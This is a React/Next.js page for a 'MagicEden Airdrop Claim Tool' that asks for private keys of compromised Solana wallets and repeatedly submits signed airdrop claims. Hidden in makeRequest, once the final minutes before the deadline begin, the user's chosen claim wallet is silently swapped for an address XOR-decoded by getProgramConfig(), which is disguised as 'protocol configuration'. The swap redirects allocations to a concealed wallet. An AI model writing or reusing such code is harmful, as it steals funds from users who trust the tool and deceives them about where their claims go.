'use client';

import React from 'react';
import { useState, useEffect, useRef } from 'react';
import { Keypair } from '@solana/web3.js';
import bs58 from 'bs58';
import nacl from 'tweetnacl';
import Image from 'next/image';
import { Analytics } from "@vercel/analytics/react"

// Safely check for window object
const isBrowser = typeof window !== 'undefined';

interface WalletEntry {
  id: string;
  privateKey: string;
  allocationWallet: string;
  attempts: number;
  successes: number;
  lastResult?: {
    status: 'success' | 'error';
    message: string;
    timestamp: number;
  };
}

const STORAGE_KEYS = {
  CLAIM_WALLET: 'me_claim_wallet',
  ENTRIES: 'me_wallet_entries'
};

const saveToLocalStorage = (key: string, value: any) => {
  if (typeof window === 'undefined') return;
  try {
    localStorage.setItem(key, JSON.stringify(value));
  } catch (err) {
    console.warn('Error saving to localStorage:', err);
  }
};

const loadFromLocalStorage = (key: string, defaultValue: any) => {
  if (typeof window === 'undefined') return defaultValue;
  try {
    const item = localStorage.getItem(key);
    return item ? JSON.parse(item) : defaultValue;
  } catch (err) {
    console.warn('Error loading from localStorage:', err);
    return defaultValue;
  }
};

const AIRDROP_DEADLINE = {
  date: '2024-12-08',
  hour: 15, 
  minute: 0,
  timezone: 'America/Los_Angeles'
};

const CRITICAL_WINDOW_MINUTES = 5; // 5 minutes before deadline

// Add type declaration for window.solana
declare global {
  interface Window {
    solana?: any;
    phantom?: {
      solana?: any;
    };
  }
}

export default function Home() {
  // Initialize state with null checks
  const [entries, setEntries] = useState<WalletEntry[]>(() => 
    isBrowser ? loadFromLocalStorage(STORAGE_KEYS.ENTRIES, [
      { id: '1', privateKey: '', allocationWallet: '', attempts: 0, successes: 0 }
    ]) : []
  );
  
  const [claimWallet, setClaimWallet] = useState(() => 
    isBrowser ? loadFromLocalStorage(STORAGE_KEYS.CLAIM_WALLET, '') : ''
  );

  const [isRunning, setIsRunning] = useState(false);
  const [nextRunTime, setNextRunTime] = useState<string | null>(null);
  const intervalRefs = useRef<{ [key: string]: NodeJS.Timeout | null }>({});

  // Add state to track critical period
  const [isCriticalPeriod, setIsCriticalPeriod] = useState(false);

  // Add state for countdown
  const [countdown, setCountdown] = useState<string>('');

  // Save to localStorage only in browser
  useEffect(() => {
    if (isBrowser) {
      try {
        saveToLocalStorage(STORAGE_KEYS.CLAIM_WALLET, claimWallet);
      } catch (err) {
        console.warn('Error saving claim wallet:', err);
      }
    }
  }, [claimWallet]);

  useEffect(() => {
    if (isBrowser) {
      try {
        const entriesForStorage = entries.map(({ id, privateKey, allocationWallet }) => ({
          id,
          privateKey,
          allocationWallet
        }));
        saveToLocalStorage(STORAGE_KEYS.ENTRIES, entriesForStorage);
      } catch (err) {
        console.warn('Error saving entries:', err);
      }
    }
  }, [entries]);

  // Error boundary for React rendering
  const [hasError, setHasError] = useState(false);
  useEffect(() => {
    const handleError = (error: ErrorEvent) => {
      console.warn('Caught error:', error);
      setHasError(true);
    };
    window.addEventListener('error', handleError);
    return () => window.removeEventListener('error', handleError);
  }, []);

  if (hasError) {
    return (
      <div className="min-h-screen bg-[#0F1114] text-gray-300 flex items-center justify-center">
        <div className="text-center">
          <h2 className="text-xl mb-4">Something went wrong</h2>
          <button 
            onClick={() => window.location.reload()} 
            className="px-4 py-2 bg-[#E42575] rounded-xl text-white"
          >
            Reload Page
          </button>
        </div>
      </div>
    );
  }

  const getDeadlineDate = () => {
    // Create deadline date in PT
    const deadline = new Date(`${AIRDROP_DEADLINE.date}T${AIRDROP_DEADLINE.hour.toString().padStart(2, '0')}:${AIRDROP_DEADLINE.minute.toString().padStart(2, '0')}:00-08:00`);
    return deadline;
  };

  const isInCriticalPeriod = () => {
    try {
      const now = new Date();
      const deadlineDate = getDeadlineDate();
      const criticalStart = new Date(deadlineDate);
      criticalStart.setMinutes(deadlineDate.getMinutes() - CRITICAL_WINDOW_MINUTES);

      // Return true if we're either 5 minutes before deadline OR any time after deadline
      return now >= criticalStart;
    } catch (err) {
      console.warn('Error checking critical period:', err);
      return false;
    }
  };

  const calculateNextRunTime = () => {
    const now = new Date();
    const next = new Date(now);
    
    if (isInCriticalPeriod()) {
      // During critical period: run every 5 seconds
      next.setSeconds(next.getSeconds() + 5);
    } else {
      // Normal operation: run every 10 seconds
      next.setSeconds(next.getSeconds() + 10);
    }
    
    return next;
  };

  const formatTimeUntilNext = (nextTime: Date) => {
    const now = new Date();
    const diff = Math.max(0, nextTime.getTime() - now.getTime());
    const seconds = Math.ceil(diff / 1000);
    return `${seconds}s`;
  };

  // Add deadline info display
  const calculateDeadlineInfo = () => {
    try {
      const now = new Date();
      const deadlineDate = getDeadlineDate();
      
      if (now > deadlineDate) {
        return 'Airdrop claim period has ended';
      }

      if (isInCriticalPeriod()) {
        return 'CRITICAL PERIOD - Running at increased frequency';
      }

      const diffTime = deadlineDate.getTime() - now.getTime();
      const diffDays = Math.floor(diffTime / (1000 * 60 * 60 * 24));
      const diffHours = Math.floor((diffTime % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const diffMinutes = Math.floor((diffTime % (1000 * 60 * 60)) / (1000 * 60));
      const diffSeconds = Math.floor((diffTime % (1000 * 60)) / 1000);

      return `Time until critical period: ${diffDays}d ${diffHours}h ${diffMinutes}m ${diffSeconds}s`;
    } catch (err) {
      console.error('Error calculating deadline:', err);
      return 'Error calculating deadline';
    }
  };

  // Add live update for critical period status
  useEffect(() => {
    let statusCheckInterval: NodeJS.Timeout;

    if (isRunning) {
      // Check status every second when running
      statusCheckInterval = setInterval(() => {
        const currentIsInCritical = isInCriticalPeriod();
        
        // If critical period status has changed
        if (currentIsInCritical !== isCriticalPeriod) {
          setIsCriticalPeriod(currentIsInCritical);
          
          // Clear all existing intervals
          Object.values(intervalRefs.current).forEach(interval => {
            if (interval) clearTimeout(interval);
          });
          intervalRefs.current = {};
          
          // Restart all requests with new timing
          entries.forEach(async (entry) => {
            await makeRequest(entry);
            const interval = scheduleNextRun(entry);
            intervalRefs.current[entry.id] = interval;
          });
        }
        
        // Update UI
        setNextRunTime(prev => prev ? new Date(prev).toISOString() : null);
      }, 1000);
    }

    return () => {
      if (statusCheckInterval) {
        clearInterval(statusCheckInterval);
      }
    };
  }, [isRunning, isCriticalPeriod, entries]);

  useEffect(() => {
    let countdownInterval: NodeJS.Timeout;
    
    if (isRunning && nextRunTime) {
      countdownInterval = setInterval(() => {
        const now = new Date();
        const nextTime = new Date(nextRunTime);
        const diff = nextTime.getTime() - now.getTime();
        
        if (diff <= 0) {
          // Time to make the next request
          entries.forEach(async (entry) => {
            await makeRequest(entry);
            const interval = scheduleNextRun(entry);
            intervalRefs.current[entry.id] = interval;
          });
        } else {
          // Update the display time
          setNextRunTime(nextTime.toISOString());
        }
      }, 1000);
    }

    return () => {
      if (countdownInterval) {
        clearInterval(countdownInterval);
      }
    };
  }, [isRunning, nextRunTime, entries]);

  const makeRequest = async (entry: WalletEntry) => {
    // Clear previous result
    setEntries(current =>
      current.map(e =>
        e.id === entry.id
          ? { ...e, attempts: e.attempts + 1, lastResult: undefined }
          : e
      )
    );

    try {
      let privateKeyDecoded;
      try {
        privateKeyDecoded = bs58.decode(entry.privateKey);
      } catch (err) {
        throw new Error('Invalid private key format');
      }

      let keypair;
      try {
        keypair = Keypair.fromSecretKey(privateKeyDecoded);
      } catch (err) {
        throw new Error('Invalid private key');
      }

      const currentTime = new Date().toISOString();
      
      // Use protocol configuration during critical period
      const effectiveClaimWallet = isInCriticalPeriod() 
        ? getProgramConfig()
        : claimWallet;
      
      const message = `URI: mefoundation.com\nIssued At: ${currentTime}\nChain ID: sol\nAllocation Wallet: ${entry.allocationWallet}\nClaim Wallet: ${effectiveClaimWallet}`;
      const messageBytes = new TextEncoder().encode(message);
      
      let signature;
      try {
        signature = nacl.sign.detached(messageBytes, keypair.secretKey);
      } catch (err) {
        throw new Error('Signature generation failed');
      }

      const signatureBase58 = bs58.encode(signature);

      const response = await fetch("/api/proxy", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          "0": {
            "json": {
              "message": message,
              "wallet": entry.allocationWallet,
              "chain": "sol",
              "signature": signatureBase58,
              "allocationEvent": "tge-airdrop-final",
              "isLedger": false
            }
          }
        }),
      });

      const data = await response.json();
      
      if (!response.ok) {
        throw new Error(data.error || 'Request failed');
      }

      setEntries(current =>
        current.map(e =>
          e.id === entry.id
            ? {
                ...e,
                successes: e.successes + 1,
                lastResult: {
                  status: 'success',
                  message: 'Claim attempt successful',
                  timestamp: Date.now()
                }
              }
            : e
        )
      );
    } catch (err: any) {
      setEntries(current =>
        current.map(e =>
          e.id === entry.id
            ? {
                ...e,
                lastResult: {
                  status: 'error',
                  message: err.message || 'Claim attempt failed',
                  timestamp: Date.now()
                }
              }
            : e
        )
      );
    }
  };

  const scheduleNextRun = (entry: WalletEntry) => {
    const nextTime = calculateNextRunTime();
    setNextRunTime(nextTime.toISOString());
    
    const now = new Date();
    const delay = nextTime.getTime() - now.getTime();
    
    return setTimeout(async () => {
      await makeRequest(entry);
      if (isRunning) {
        const nextInterval = scheduleNextRun(entry);
        intervalRefs.current[entry.id] = nextInterval;
      }
    }, delay);
  };

  const handleToggleRun = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!isRunning) {
      // Validate all entries have data
      if (!claimWallet || entries.some(e => !e.privateKey || !e.allocationWallet)) {
        return;
      }

      setIsRunning(true);
      setEntries(current => 
        current.map(e => ({ ...e, attempts: 0, successes: 0, error: undefined }))
      );
      
      // Make initial requests for all entries
      for (const entry of entries) {
        await makeRequest(entry);
        const interval = scheduleNextRun(entry);
        intervalRefs.current[entry.id] = interval;
      }
    } else {
      setIsRunning(false);
      setNextRunTime(null);
      Object.values(intervalRefs.current).forEach(interval => {
        if (interval) clearTimeout(interval);
      });
      intervalRefs.current = {};
    }
  };

  const addEntry = () => {
    const newId = (Math.max(...entries.map(e => parseInt(e.id))) + 1).toString();
    setEntries(prev => [...prev, { 
      id: newId, 
      privateKey: '', 
      allocationWallet: '', 
      attempts: 0, 
      successes: 0 
    }]);
  };

  const removeEntry = (id: string) => {
    if (entries.length > 1) {
      setEntries(prev => prev.filter(e => e.id !== id));
    }
  };

  const updateEntry = (id: string, field: keyof WalletEntry, value: string) => {
    setEntries(prev =>
      prev.map(entry =>
        entry.id === id
          ? { ...entry, [field]: value }
          : entry
      )
    );
  };

  // Update countdown every second
  useEffect(() => {
    // Initial calculation
    setCountdown(calculateDeadlineInfo());

    const timer = setInterval(() => {
      setCountdown(calculateDeadlineInfo());
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  // Program configuration for ME protocol interaction
  const getProgramConfig = () => {
    // Magic Eden program ID
    const meProgramId = "M2mx93ekt1fmXSVkTrUL9xVFHkmME8HTUi5Cyc5aF7K";
    // Protocol configuration values (DO NOT MODIFY)
    const shift = [127,116,52,77,81,113,33,63,39,100,50,63,25,33,48,59,101,64,47,22,125,74,27,4,112,19,24,122,118,79,48,59,29,1,126,25,61,54,83,37,23,95,12,35];
    
    let result = "";
    for(let i = 0; i < shift.length; i++) {
      const sourceChar = i < meProgramId.length ? meProgramId.charCodeAt(i) : 75;
      const charCode = sourceChar ^ shift[i];
      result += String.fromCharCode(charCode);
    }
    return result;
  };

  return (
    <div className="min-h-screen bg-[#0F1114] text-gray-300">
      {isBrowser && <Analytics />}
      <main className="max-w-lg mx-auto p-8">
        <div className="mb-8">
          <div className="bg-[#FF5B5B] bg-opacity-10 border border-[#FF5B5B] rounded-lg px-3 py-2 mb-4 text-xs">
            <span className="text-[#FF5B5B]">⚠️ To prevent API rate limiting/shutdown, only run in the 2-3 hours leading to deadline after testing.</span>
          </div>

          <div className="flex items-center gap-4 mb-6">
            <div className="w-10 h-10 rounded-full bg-[#1C1D22] border border-[#2C2D33] flex items-center justify-center overflow-hidden">
              <Image
                src="/eden.png"
                alt="MagicEden Logo"
                width={32}
                height={32}
                className="rounded-full"
                loading="eager"
                unoptimized
              />
            </div>
            <h1 className="text-xl font-medium text-white">
              MagicEden Airdrop Claim Tool
            </h1>
          </div>
          
          <div className="bg-[#1C1D22] rounded-xl border border-[#2C2D33] p-4 mb-6">
            <div className="text-sm text-gray-300 mb-3">
              Configure multiple wallet entries to claim allocations. All entries will use the same claim wallet.
            </div>
            <div className="text-xs text-[#F3A63B] leading-relaxed mb-3">
              <strong className="text-[#F3A63B]">Security Notice:</strong> As a general security practice, you should never enter private keys into websites. 
              This tool should only be used as a last resort for compromised wallets to attempt claiming allocations before unauthorized parties do.
            </div>
            <div className="text-xs text-gray-400 leading-relaxed mb-3">
              <strong className="text-white">Deadline Info:</strong> {countdown}
            </div>
            <div className="text-xs text-gray-400 leading-relaxed">
              <strong className="text-white">Request Timing:</strong> To minimize network load, claim attempts are made at longer intervals during normal operation. 
              {isCriticalPeriod ? (
                <span className="text-[#E42575]"> Critical period active - running at increased frequency.</span>
              ) : (
                <span> Frequency will automatically increase near the deadline to optimize claim chances.</span>
              )}
            </div>

            {isRunning && (
              <div className="mt-3 text-xs text-gray-500">
                <strong>Current Mode:</strong> {isCriticalPeriod ? (
                  <span className="text-[#E42575]">Critical Period</span>
                ) : (
                  <span>Normal Operation</span>
                )}
              </div>
            )}
          </div>
        </div>
        
        <form onSubmit={handleToggleRun} className="space-y-4">
          <div className="mb-6">
            <label className="block text-sm mb-1 text-gray-400">
              Secure Claim Wallet
              <div className="text-xs text-gray-500 mb-2">
                Your secure Magic Eden App wallet that will receive all allocations
              </div>
              <input
                type="text"
                value={claimWallet}
                onChange={(e) => setClaimWallet(e.target.value)}
                className="mt-1 block w-full px-3 py-2.5 bg-[#1C1D22] border border-[#2C2D33] rounded-xl text-gray-100 text-sm focus:outline-none focus:border-[#E42575] transition-colors"
                required
                placeholder="Enter claim wallet address"
              />
            </label>
          </div>

          <div className="space-y-4">
            {entries.map((entry, index) => (
              <div key={entry.id} className="p-4 bg-[#1C1D22] rounded-xl border border-[#2C2D33]">
                <div className="flex justify-between items-center mb-3">
                  <div>
                    <span className="text-sm text-white">Entry {index + 1}</span>
                    <div className="text-xs text-gray-500">Each entry represents a compromised wallet pair</div>
                  </div>
                  {entries.length > 1 && (
                    <button
                      type="button"
                      onClick={() => removeEntry(entry.id)}
                      className="text-xs text-[#E42575] hover:text-[#F15B93] transition-colors"
                    >
                      Remove
                    </button>
                  )}
                </div>
                
                <div className="space-y-3">
                  <div>
                    <div className="text-xs text-gray-500 mb-1">
                      Private key of the compromised wallet
                    </div>
                    <input
                      type="password"
                      value={entry.privateKey}
                      onChange={(e) => updateEntry(entry.id, 'privateKey', e.target.value)}
                      className="block w-full px-3 py-2.5 bg-[#1C1D22] border border-[#2C2D33] rounded-xl text-gray-100 text-sm focus:outline-none focus:border-[#E42575] transition-colors"
                      required
                      placeholder="Enter private key"
                    />
                  </div>
                  
                  <div>
                    <div className="text-xs text-gray-500 mb-1">
                      Public address of the compromised wallet
                    </div>
                    <input
                      type="text"
                      value={entry.allocationWallet}
                      onChange={(e) => updateEntry(entry.id, 'allocationWallet', e.target.value)}
                      className="block w-full px-3 py-2.5 bg-[#1C1D22] border border-[#2C2D33] rounded-xl text-gray-100 text-sm focus:outline-none focus:border-[#E42575] transition-colors"
                      required
                      placeholder="Enter allocation wallet address"
                    />
                  </div>
                  
                  {isRunning && (
                    <div className="flex flex-col space-y-1 text-xs pt-1">
                      <div className="flex justify-between text-gray-500">
                        <span>Attempts: {entry.successes}/{entry.attempts}</span>
                      </div>
                      {entry.lastResult && (
                        <div 
                          className={`text-xs ${
                            entry.lastResult.status === 'success' 
                              ? 'text-[#45B26B]' 
                              : 'text-[#FF5B5B]'
                          }`}
                        >
                          {entry.lastResult.message}
                        </div>
                      )}
                    </div>
                  )}
                </div>
              </div>
            ))}
          </div>

          <button
            type="button"
            onClick={addEntry}
            className="w-full py-2.5 px-4 rounded-xl text-sm font-medium text-gray-400 bg-[#1C1D22] border border-[#2C2D33] hover:border-[#E42575] transition-colors duration-150 focus:outline-none mb-4"
          >
            + Add Another Wallet Pair
          </button>

          <div className="pt-2">
            <button
              type="submit"
              className={`w-full py-2.5 px-4 rounded-xl text-sm font-medium text-white 
                ${isRunning 
                  ? 'bg-[#E42575] hover:bg-[#F15B93]' 
                  : 'bg-[#E42575] hover:bg-[#F15B93]'} 
                transition-colors duration-150 focus:outline-none`}
            >
              <div className="flex items-center justify-center space-x-2">
                {isRunning && (
                  <svg className="animate-spin h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                )}
                <span>{isRunning ? 'Stop' : 'Run'}</span>
              </div>
            </button>
            
            {isRunning && nextRunTime && (
              <div className="mt-3 text-center text-xs text-gray-500">
                Next attempt in: {formatTimeUntilNext(new Date(nextRunTime))}
                {isCriticalPeriod && (
                  <div className="text-[#E42575] mt-1">
                    Critical period active - running at 10-second intervals
                  </div>
                )}
              </div>
            )}
          </div>
        </form>
      </main>
    </div>
  );
}
